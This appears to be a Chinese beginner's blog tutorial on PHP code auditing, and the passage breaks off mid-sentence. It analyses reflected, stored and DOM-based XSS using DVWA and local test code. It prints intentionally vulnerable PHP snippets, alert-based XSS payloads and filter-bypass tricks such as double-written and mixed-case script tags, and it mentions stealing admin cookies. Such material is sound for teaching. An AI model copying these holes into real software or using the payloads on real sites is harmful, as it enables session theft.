
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>代码审计入门 | Bug&#39;小虫</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="小虫">
    

    
    <meta name="description" content="前言最近在看php代码审计，学习下代码审计，看了不少师傅的博客，写的很好，下面不少是借鉴师傅们的，好记性不如烂笔头，记下，以后可以方便查看。 php代码审计需要比较强的代码能力和足够的耐心。这篇文章是写给我这样的刚刚开始审计的菜鸟，下面如果写的哪里有错误的话，还望提出,不吝赐教。在这里也立个flag：一周至少审计一种CMS（大小不分），希望自己能够坚持下去，任重而道远。 代码审计–准备1，先放一张">
<meta property="og:type" content="article">
<meta property="og:title" content="代码审计入门">
<meta property="og:url" content="http://yoursite.com/2017/06/07/代码审计入门/index.html">
<meta property="og:site_name" content="Bug&#39;小虫">
<meta property="og:description" content="前言最近在看php代码审计，学习下代码审计，看了不少师傅的博客，写的很好，下面不少是借鉴师傅们的，好记性不如烂笔头，记下，以后可以方便查看。 php代码审计需要比较强的代码能力和足够的耐心。这篇文章是写给我这样的刚刚开始审计的菜鸟，下面如果写的哪里有错误的话，还望提出,不吝赐教。在这里也立个flag：一周至少审计一种CMS（大小不分），希望自己能够坚持下去，任重而道远。 代码审计–准备1，先放一张">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://images2017.cnblogs.com/blog/1062851/201710/1062851-20171031211339873-764826001.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim ">
<meta property="og:updated_time" content="2018-07-10T15:27:03.813Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="代码审计入门">
<meta name="twitter:description" content="前言最近在看php代码审计，学习下代码审计，看了不少师傅的博客，写的很好，下面不少是借鉴师傅们的，好记性不如烂笔头，记下，以后可以方便查看。 php代码审计需要比较强的代码能力和足够的耐心。这篇文章是写给我这样的刚刚开始审计的菜鸟，下面如果写的哪里有错误的话，还望提出,不吝赐教。在这里也立个flag：一周至少审计一种CMS（大小不分），希望自己能够坚持下去，任重而道远。 代码审计–准备1，先放一张">
<meta name="twitter:image" content="https://images2017.cnblogs.com/blog/1062851/201710/1062851-20171031211339873-764826001.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim ">

    
    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="[layout]" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/06/07/代码审计入门/" title="代码审计入门" itemprop="url">代码审计入门</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-06-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2017-06-07</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码审计–准备"><span class="toc-number">2.</span> <span class="toc-text">代码审计–准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码审计–漏洞"><span class="toc-number">3.</span> <span class="toc-text">代码审计–漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞类型"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码执行审计"><span class="toc-number">3.1.1.</span> <span class="toc-text">代码执行审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行审计"><span class="toc-number">3.1.2.</span> <span class="toc-text">命令执行审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含审计"><span class="toc-number">3.1.3.</span> <span class="toc-text">文件包含审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传审计"><span class="toc-number">3.1.4.</span> <span class="toc-text">文件上传审计</span></a></li></ol></li></ol></li></ol>
		
		</div>
		
		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看php代码审计，学习下代码审计，看了不少师傅的博客，写的很好，下面不少是借鉴师傅们的，好记性不如烂笔头，记下，以后可以方便查看。</p>
<p>php代码审计需要比较强的代码能力和足够的耐心。这篇文章是写给我这样的刚刚开始审计的菜鸟，下面如果写的哪里有错误的话，还望提出,不吝赐教。<br>在这里也立个flag：一周至少审计一种CMS（大小不分），希望自己能够坚持下去，任重而道远。</p>
<h1 id="代码审计–准备"><a href="#代码审计–准备" class="headerlink" title="代码审计–准备"></a>代码审计–准备</h1><p>1，先放一张大图，php代码审计的几个方向，也是容易出问题的地方，没事的时候可以多看看。</p>
<p><img src="https://images2017.cnblogs.com/blog/1062851/201710/1062851-20171031211339873-764826001.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim "></p>
<p>2，代码审计也就是拿到某网站的源码，进行审计，从而发现漏洞，但是我们审计的时候并不一定要一行一行的去看吧，这样未免也太浪费时间了，所以我们需要工具进行帮助我们。当属 “Seay源代码审计系统2.1” 优先选择（静态分析，关键字查找定位代码不错，但是误报很高）。</p>
<p>我们在做代码审计的时候，个人建议先要把审计的某CMS随便点点，先熟悉一下功能。代码审计前先进行黑盒测试是个不错的选择，知道哪里有问题，然后再去找出问题的代码。</p>
<p>要关注变量和函数，</p>
<p> 1.可以控制的变量【一切输入都是有害的 】<br> 2.变量到达有利用价值的函数[危险函数] 【一切进入函数的变量是有害的】<br>                                                                    ——来源t00ls</p>
<h1 id="代码审计–漏洞"><a href="#代码审计–漏洞" class="headerlink" title="代码审计–漏洞"></a>代码审计–漏洞</h1><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">sql注入</span><br><span class="line"></span><br><span class="line">文件操作[上传/写入/读取/删除]</span><br><span class="line"> </span><br><span class="line">文件包含</span><br><span class="line"> </span><br><span class="line">命令执行</span><br><span class="line"> </span><br><span class="line">xss</span><br><span class="line"> </span><br><span class="line">cookie欺骗</span><br><span class="line"> </span><br><span class="line">逻辑漏洞</span><br><span class="line"> </span><br><span class="line">........等等</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">我们平常再进行黑盒测试时，上面的每种漏洞都有相对应的挖掘技巧，这里代码审计也是有技巧的。我们进行黑盒测试 getshell的时候，往往是上面的sql注入，文件操作（上传），文件包含，命令执行相对容易getshell的。xss的话危害也很大，可以泄露内网的信息，如果的是存储型xss的话，就可以打管理员的cookie，然后进行下一步的攻击。逻辑漏洞是相对麻烦的，危害是很要命的，逻辑漏洞也分为很多种，其中一元买东西是很出彩的，这里通过修改订单进行伪造支付金额。</span><br><span class="line">所以我们要认识清楚漏洞原理，积累cms常出漏洞，积累找这种漏洞的技巧。</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 漏洞分析</span></span><br><span class="line">下面我们就进行分析一下各种漏洞形成的原因吧</span><br><span class="line"><span class="comment">### 环境准备 首先我们要做好准备工作，审计环境：windows环境（Apache+MySQL+php），可以使用集成的，wampserver，phpstudy其他，我用的是wamp，这里在下载的时候不要用版本太高的，因为版本太高，会出现php语法警告以及不兼容的情况。（下一篇也就是我准备写的一个审计笔记，我平常用的wampserver，由于我的mysql的版本太高，一直安装不成功，后来又重装了一个环境 (upupw)，会在下一篇详细介绍）（文章里面所提到的环境和工具后面都会分享到百度云盘）。</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">### 黑盒测试 准备好了就直接上手分析吗？其实有更不错的选择，那就是----黑盒+白盒。黑盒很重要！黑盒很重要！黑盒很重要！这是重要的事情。我们在黑盒测试的时候，可以花费点时间，因为用的时间越多，我们对所要分析的CMS的功能更熟悉，代码审计的时候也就容易分析，比如看到搜索框，当然要看下有没有注入或者是能不能弹出来框框，以及留言板有没有xss。交互的数据很重要！</span></span><br><span class="line">这里有个小技巧，本地测试的时候要把输入点打印出来。</span><br><span class="line">将用户的输入数据进行var_dump，重要的是对最终的sql语句进行var_dump,这和给你省去很多力气！我们只要var_dump(<span class="variable">$sql</span>)然后再可以去黑盒测试，[比如搜索框，用户登入，文件上传名称等等]。</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 漏洞类型</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### XSS漏洞</span></span><br><span class="line">XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。 xss分为存储型的xss和反射型xss, 基于DOM的跨站脚本XSS。</span><br><span class="line"> </span><br><span class="line"><span class="comment">##### 【反射型】</span></span><br><span class="line">反射型xss审计的时候基本的思路都一样，通过寻找可控没有过滤（或者可以绕过）的参数，通过<span class="built_in">echo</span>等输出函数直接输出。寻找的一般思路就是寻找输出函数，再去根据函数寻找变量。一般的输出函数有这些：<span class="built_in">print</span> , print_r , <span class="built_in">echo</span> , <span class="built_in">printf</span> , sprintf , die , var_dump ,var_export。</span><br><span class="line"></span><br><span class="line">测试代码如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'xssf'</span>];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/<span class="built_in">test</span>/xssf.php?xssf=&lt;script&gt;alert(/orange/);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">可能有人会有情绪不高，因为这是自己写的，玩起来没有成就感，</span><br><span class="line">那我们可以用渗透平台 DVWA 呀（后面会分享到百度云盘，有了wampserver环境，直接把文件夹放/wamp/www/目录就可以），当然了，这里我们选择low的难度，因为好分析。我们输入&lt;script&gt;alert(<span class="string">"orange"</span>)&lt;/script&gt;，会弹出框框。如下图所示</span><br><span class="line">相关链接（http://127.0.0.1/DVWA-1.9/vulnerabilities/xss_r/?name=&lt;script&gt;alert(<span class="string">"orange"</span>)&lt;/script&gt;<span class="comment">#）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分析如下：首先看下源码</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">这里我们可以清楚的看到 <span class="keyword">if</span> 里面的php函数array_key_exists，现在不懂没关系，百度一下你就知道。</span><br><span class="line"></span><br><span class="line">array_key_exists(key,array)key 必需。规定键名。 </span><br><span class="line">array 必需。规定数组。 </span><br><span class="line"></span><br><span class="line">array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 <span class="literal">true</span>，如果键名不存在则返回 <span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line">输入的值也就是GET得到的值是以数组的形式，然后判断GET得到的name是不是空，如果满足 <span class="keyword">if</span> 语句，这里就会进行 <span class="keyword">if</span> 括号里面的，<span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; 我们可以清楚的看到,这里直接输出传的name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这里我们可以再进行分析一下medium中等难度下的代码</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Hello <span class="variable">$&#123;name&#125;</span>&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">可以看到有一点上low的代码是不一样的，那就是进行了一次过滤，</span><br><span class="line"></span><br><span class="line">用的str_replace()函数，这个函数的功能是：以其他字符替换字符串中的一些字符（区分大小写）。</span><br><span class="line"></span><br><span class="line">这里的作用是替换&lt;script&gt;，也就是把&lt;script&gt;替换成空格，然后再进行输出。</span><br><span class="line"></span><br><span class="line">这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的&lt;script&gt;删除，这种防护机制是可以被轻松绕过的。</span><br><span class="line"></span><br><span class="line">双写绕过：输入&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;，成功弹框。</span><br><span class="line"></span><br><span class="line">大小写混淆绕过：输入&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;，成功弹框。这里就不截图了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">High等级也是基于黑名单思想，进行过滤。但是我们可以通过其他标签来进行XSS。</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); 代码如上，这里就不一一分析了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 【存储型】</span></span><br><span class="line"></span><br><span class="line">存储型xss审计和反射型xss审计时候思路差不多，不过存储型xss会在数据库“中转”一下，主要审计sql语句update ,insert更新和插入。</span><br><span class="line"></span><br><span class="line">进行白盒审计前，我们先进行下黑盒测试</span><br><span class="line"></span><br><span class="line">输入name的时候发现，name输不了那么多了，这是我们可以右键审查元素，可以看到限制长度为10了，其实说这句话，只是想提醒一下像我这样的小白，审查元素也是一门<span class="string">"学问"</span></span><br><span class="line"></span><br><span class="line">name出随便输入，message处输入：&lt;script&gt;alert(/orange/)&lt;/script&gt;，可以看到会弹出框框</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这是看下源码，我们分析下</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line"></span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line"></span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">可以看到接收POST过来的参数，trim()函数是移除字符串两侧的空白字符或其他预定义字符。</span><br><span class="line"></span><br><span class="line">这里先进行过滤一下，把我们输入字符串两侧的空白字符和其他预定义字符给过滤掉。预定义字符包括：\t,\n,\x0B,\r以及空格。</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">然后stripslashes()函数：删除反斜杠</span><br><span class="line"></span><br><span class="line">然后message参数再经过mysql_real_escape_string()函数进行转义。</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">•\x00</span><br><span class="line">•\n</span><br><span class="line">•\r</span><br><span class="line">•\</span><br><span class="line">•<span class="string">'</span></span><br><span class="line"><span class="string">•"</span></span><br><span class="line"><span class="string">•\x1a</span></span><br><span class="line"><span class="string">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后给插入数据库。这个时候我们去数据库看一下，如下图，可以看到xss代码已经插入数据库了，这也就是存储型XSS与反射性XSS的区别。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">因为我们在前端看到的都是经由数据库传过来的数据，所以会弹出框框。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这里我最后总结一下，顺便再分析一下。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">我输入的值是：&lt;script&gt;alert(/orange/)&lt;/script&gt;，首先上面的trim() 函数过滤空格和预定义字符，这里对输入的值是没有影响的，所以$messsge还是&lt;script&gt;alert(/orange/)&lt; /script&gt;，然后stripslashes()函数删除反斜杠，由于输入的message没有反斜杠，所以无效。$message还是&lt;script&gt;alert(/orange /)&lt;/script&gt;，最后用mysql_real_escape_string()函数进行转义，上面可以清楚的看到这个函数对什么字符有影响，但是没有对$message有影响，所以这时的$_message还是&lt;script&gt;alert(/orange/)&lt;/script&gt;这个时候就把$message传入数据库，也就是上图数据库中的数据。前端读取的数据的时候是从数据库中读取，因此把$message读出来，从而造成了存储型XSS漏洞。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">还有medium,high，这里就不做分析了，这里解决XSS漏洞的方法就是用htmlspecialchars函数进行编码。但是要注意的是，如果htmlspecialchars函数使用不当，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。说的DOM型XSS，下面就是啦。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">##### 【DOM】</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个DVWA里面没有这种，这里还是我们自己动手丰衣足食吧。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">基于DOM的跨站脚本XSS：通过访问document.URL 或者document.location执行一些客户端逻辑的javascript代码。不依赖发送给服务器的数据。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;HTML&gt;</span></span><br><span class="line"><span class="string">&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;</span></span><br><span class="line"><span class="string">Hi</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;</span></span><br><span class="line"><span class="string">var pos=document.URL.indexOf("name=")+5;</span></span><br><span class="line"><span class="string">document.write(document.URL.substring(pos,document.URL.length));</span></span><br><span class="line"><span class="string">&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string">&lt;BR&gt;</span></span><br><span class="line"><span class="string">Welcome to our system</span></span><br><span class="line"><span class="string">…</span></span><br><span class="line"><span class="string">&lt;/HTML&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">浏览器开始解析这个HTML为DOM，DOM包含一个对象叫document，document里面有个URL属性，这个属性里填充着当前页面的 URL。当解析器到达javascript代码，它会执行它并且修改你的HTML页面。倘若代码中引用了document.URL，那么，这部分字符串将会在解析时嵌入到HTML中，然后立即解析，同时，javascript代码会找到(alert(…))并且在同一个页面执行它，这就产生了xss的条件。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. 恶意程序脚本在任何时候不会嵌入到处于自然状态下的HTML页面（这和其他种类的xss不太一样）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.这个攻击只有在浏览器没有修改URL字符时起作用。 当url不是直接在地址栏输入，Mozilla.会自动转换在document.URL中字符&lt;和&gt;（转化为%3C  和 